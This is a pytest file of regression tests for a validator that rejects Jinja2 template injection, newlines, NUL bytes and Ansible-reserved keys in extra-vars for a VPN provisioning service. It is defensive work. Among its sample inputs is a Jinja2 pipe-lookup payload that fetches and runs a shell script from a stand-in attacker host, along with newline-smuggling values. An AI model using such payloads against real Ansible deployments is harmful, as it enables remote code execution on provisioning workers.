"""Regression tests for ``_validate_extra_vars`` (audit #56).

The collector that builds ``--extra-vars`` for ``site.yml`` pulls values
from admin-controlled JSONB columns on ``VPNConfig.settings`` and
``VPNNode.relay_config``. Those values are JSON-encoded before being
handed to ``ansible-playbook``, which closes shell injection — but
ansible still evaluates the decoded strings as Jinja2 templates when a
role references them. A hostile ``{{ lookup('pipe', '…') }}`` payload
would execute on the worker.

These tests exercise ``_validate_extra_vars`` directly so we don't need
a real DB; the collector's job is just to plug values into the dict,
and the validator is what refuses to hand them to ansible.
"""
from __future__ import annotations

import pytest

from app.services.provisioning import (
    _FORBIDDEN_EXTRA_KEYS,
    _JINJA_MARKERS,
    _validate_extra_vars,
)


def test_validator_accepts_normal_values() -> None:
    ok = {
        "shadowtls_port": 443,
        "shadowtls_password": "aB3cD+e/f=",  # base64-ish, not a Jinja marker
        "shadowtls_handshake_domain": "www.microsoft.com",
        "vpn_health_ports": [443, 8443],
        "relay_wg_address_v4": "10.0.0.2/32",
        "vless_reality_sni": "cdn.example.org",
    }
    _validate_extra_vars(ok, node_hint="1/test-node")


@pytest.mark.parametrize("marker", list(_JINJA_MARKERS))
def test_validator_rejects_jinja_markers(marker: str) -> None:
    bad = {
        "shadowtls_handshake_domain": f"example.com{marker} lookup",
    }
    with pytest.raises(ValueError, match="Jinja2 marker"):
        _validate_extra_vars(bad, node_hint="1/test-node")


def test_validator_rejects_pipe_lookup_payload() -> None:
    """Real-world Jinja2-injection shape."""
    bad = {
        "vless_reality_short_id": "{{ lookup('pipe', 'curl attacker.example | sh') }}",
    }
    with pytest.raises(ValueError, match="Jinja2 marker"):
        _validate_extra_vars(bad, node_hint="1/test-node")


def test_validator_rejects_for_block() -> None:
    bad = {"hysteria2_obfs": "{% for x in range(9999) %}x{% endfor %}"}
    with pytest.raises(ValueError, match="Jinja2 marker"):
        _validate_extra_vars(bad, node_hint="1/test-node")


def test_validator_rejects_newline() -> None:
    bad = {"shadowtls_handshake_domain": "example.com\nmalicious: true"}
    with pytest.raises(ValueError, match="newline"):
        _validate_extra_vars(bad, node_hint="1/test-node")


def test_validator_rejects_carriage_return() -> None:
    bad = {"shadowtls_handshake_domain": "example.com\rmal"}
    with pytest.raises(ValueError, match="newline"):
        _validate_extra_vars(bad, node_hint="1/test-node")


def test_validator_rejects_nul_byte() -> None:
    bad = {"shadowtls_password": "password\x00appended"}
    with pytest.raises(ValueError, match="NUL byte"):
        _validate_extra_vars(bad, node_hint="1/test-node")


@pytest.mark.parametrize("reserved", sorted(_FORBIDDEN_EXTRA_KEYS))
def test_validator_rejects_ansible_reserved_keys(reserved: str) -> None:
    bad = {reserved: "anything"}
    with pytest.raises(ValueError, match="reserved by ansible"):
        _validate_extra_vars(bad, node_hint="1/test-node")


def test_validator_ignores_non_string_values() -> None:
    """Ints, lists and bools never go through Jinja2 — they pass."""
    ok = {
        "shadowtls_port": 443,
        "vpn_health_ports": [443, 8443, 9443],
        "hysteria2_up_mbps": 100,
        "is_enabled": True,
        "nothing_here": None,
    }
    _validate_extra_vars(ok, node_hint="1/test-node")


def test_validator_reports_offending_key_name() -> None:
    """The error must name the bad key so operators can find it."""
    bad = {
        "vless_reality_short_id": "{{ exploit }}",
    }
    with pytest.raises(ValueError) as excinfo:
        _validate_extra_vars(bad, node_hint="42/vpn-nl-3")
    msg = str(excinfo.value)
    assert "vless_reality_short_id" in msg
    assert "42/vpn-nl-3" in msg


def test_validator_empty_dict_is_fine() -> None:
    _validate_extra_vars({}, node_hint="1/test-node")
